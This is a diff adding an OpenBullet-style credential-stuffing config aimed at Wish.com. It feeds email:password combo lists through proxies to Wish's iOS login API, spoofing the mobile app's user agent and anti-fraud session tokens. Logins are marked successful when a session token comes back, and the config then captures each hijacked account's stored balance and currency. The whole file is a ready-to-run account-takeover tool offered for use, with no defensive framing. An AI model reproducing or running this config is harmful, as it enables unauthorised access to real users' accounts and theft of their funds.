@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "Wish.com",
+  "SuggestedBots": 73,
+  "MaxCPM": 0,
+  "LastModified": "2019-11-18T12:18:37.0314866+01:00",
+  "AdditionalInfo": "",
+  "Author": "Younes",
+  "Version": "1.3.9 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.wish.com/api/email-login" 
+  CONTENT "_app_type=wish&_capabilities%5B%5D=2&_capabilities%5B%5D=4&_capabilities%5B%5D=3&_capabilities%5B%5D=6&_capabilities%5B%5D=7&_capabilities%5B%5D=9&_capabilities%5B%5D=11&_capabilities%5B%5D=12&_capabilities%5B%5D=13&_capabilities%5B%5D=15&_capabilities%5B%5D=21&_capabilities%5B%5D=24&_capabilities%5B%5D=25&_capabilities%5B%5D=28&_capabilities%5B%5D=32&_capabilities%5B%5D=33&_capabilities%5B%5D=35&_capabilities%5B%5D=39&_capabilities%5B%5D=40&_capabilities%5B%5D=43&_capabilities%5B%5D=46&_capabilities%5B%5D=47&_capabilities%5B%5D=49&_capabilities%5B%5D=51&_capabilities%5B%5D=52&_capabilities%5B%5D=55&_capabilities%5B%5D=61&_capabilities%5B%5D=64&_capabilities%5B%5D=65&_capabilities%5B%5D=70&_capabilities%5B%5D=72&_capabilities%5B%5D=76&_capabilities%5B%5D=77&_capabilities%5B%5D=53&_capabilities%5B%5D=55&_capabilities%5B%5D=84&_capabilities%5B%5D=88&_capabilities%5B%5D=89&_capabilities%5B%5D=78&_capabilities%5B%5D=92&_capabilities%5B%5D=93&_capabilities%5B%5D=94&_capabilities%5B%5D=95&_capabilities%5B%5D=97&_capabilities%5B%5D=98&_capabilities%5B%5D=99&_capabilities%5B%5D=105&_capabilities%5B%5D=106&_capabilities%5B%5D=110&_capabilities%5B%5D=120&_capabilities%5B%5D=127&_capabilities%5B%5D=123&_capabilities%5B%5D=125&_capabilities%5B%5D=130&_capabilities%5B%5D=131&_capabilities%5B%5D=135&_capabilities%5B%5D=145&_capabilities%5B%5D=117&_capabilities%5B%5D=147&_capabilities%5B%5D=158&_capabilities%5B%5D=156&_capabilities%5B%5D=161&_capabilities%5B%5D=164&_capabilities%5B%5D=167&_capabilities%5B%5D=124&_cashshield_session_id=3EBD45C2-6163-40E6-9439-DAAAAC68D9CB&_client=iosapp&_riskified_session_token=B9AF7473-866A-4498-B68B-EF753AC7B7AA&_threat_metrix_session_token=7625-D5C2C287-36DD-4575-93EA-A0E923EBFA74&_version=4.18.7&_xsrf=1&app_device_id=4b45a41263a3f84067940981aafdfe58b34d0132&app_device_model=iPhone9%2C3&email=<USER>&from_ad=false&icloud_autologin=false&password=<PASS>&session_refresh=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "_xsrf: 1" 
+  HEADER "Host: www.wish.com" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Wish/4.18.7 (com.contextlogic.Wish; build:1029; iOS 12.0.1) Alamofire/4.8.2" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Email or Password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "session_token" 
+
+REQUEST POST "https://www.wish.com/api/user/status" 
+  CONTENT "_app_type=wish&_capabilities%5B%5D=2&_capabilities%5B%5D=4&_capabilities%5B%5D=3&_capabilities%5B%5D=6&_capabilities%5B%5D=7&_capabilities%5B%5D=9&_capabilities%5B%5D=11&_capabilities%5B%5D=12&_capabilities%5B%5D=13&_capabilities%5B%5D=15&_capabilities%5B%5D=21&_capabilities%5B%5D=24&_capabilities%5B%5D=25&_capabilities%5B%5D=28&_capabilities%5B%5D=32&_capabilities%5B%5D=33&_capabilities%5B%5D=35&_capabilities%5B%5D=39&_capabilities%5B%5D=40&_capabilities%5B%5D=43&_capabilities%5B%5D=46&_capabilities%5B%5D=47&_capabilities%5B%5D=49&_capabilities%5B%5D=51&_capabilities%5B%5D=52&_capabilities%5B%5D=55&_capabilities%5B%5D=61&_capabilities%5B%5D=64&_capabilities%5B%5D=65&_capabilities%5B%5D=70&_capabilities%5B%5D=72&_capabilities%5B%5D=76&_capabilities%5B%5D=77&_capabilities%5B%5D=53&_capabilities%5B%5D=55&_capabilities%5B%5D=84&_capabilities%5B%5D=88&_capabilities%5B%5D=89&_capabilities%5B%5D=78&_capabilities%5B%5D=92&_capabilities%5B%5D=93&_capabilities%5B%5D=94&_capabilities%5B%5D=95&_capabilities%5B%5D=97&_capabilities%5B%5D=98&_capabilities%5B%5D=99&_capabilities%5B%5D=105&_capabilities%5B%5D=106&_capabilities%5B%5D=110&_capabilities%5B%5D=120&_capabilities%5B%5D=127&_capabilities%5B%5D=123&_capabilities%5B%5D=125&_capabilities%5B%5D=130&_capabilities%5B%5D=131&_capabilities%5B%5D=135&_capabilities%5B%5D=145&_capabilities%5B%5D=117&_capabilities%5B%5D=147&_capabilities%5B%5D=158&_capabilities%5B%5D=156&_capabilities%5B%5D=161&_capabilities%5B%5D=164&_capabilities%5B%5D=167&_capabilities%5B%5D=124&_cashshield_session_id=3EBD45C2-6163-40E6-9439-DAAAAC68D9CB&_client=iosapp&_riskified_session_token=B9AF7473-866A-4498-B68B-EF753AC7B7AA&_threat_metrix_session_token=7625-D5C2C287-36DD-4575-93EA-A0E923EBFA74&_version=4.18.7&_xsrf=1&app_device_id=4b45a41263a3f84067940981aafdfe58b34d0132&app_device_model=iPhone9%2C3&supports_mobile_action_dict=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.wish.com" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Wish/1029 CFNetwork/974.2.1 Darwin/18.0.0" 
+
+PARSE "<SOURCE>" JSON "currency_code" -> VAR "Currency" 
+
+PARSE "<SOURCE>" JSON "localized_value" -> CAP "Balance" "" " <Currency>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "localized_amount\": {\"localized_value\": 0" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Balance>" Contains "0" 
+
